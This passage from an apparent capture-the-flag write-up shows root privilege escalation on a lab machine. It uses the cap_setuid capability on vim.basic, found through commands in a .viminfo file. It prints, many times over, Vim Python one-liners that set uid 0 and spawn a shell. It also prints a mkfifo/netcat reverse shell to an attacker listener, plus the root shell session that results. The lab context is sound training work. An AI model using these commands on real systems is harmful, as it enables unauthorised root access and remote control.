-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# History of marks within files (newest to oldest):

> :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
        "       3       0
        ^       3       1
        .       3       0
        +       3       0

> :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
        "       1       0

> :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
        "       1       0
        ^       3       0
        .       2       2
        +       2       2
leonard@undiscovered:~$ 

```

After searching online, I found that the Python command reported multiple times in `.viminfo` file, in addition with a `cap_setuid` on `vim.basic` binary, is a common vector of privilege escalation. 

So, I tried to execute the reverse shell command after setting up a listener.

```
leonard@undiscovered:~$ vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.105 4444 >/tmp/f")'
```

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.130.105] from (UNKNOWN) [10.112.166.168] 39572
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}

#
```
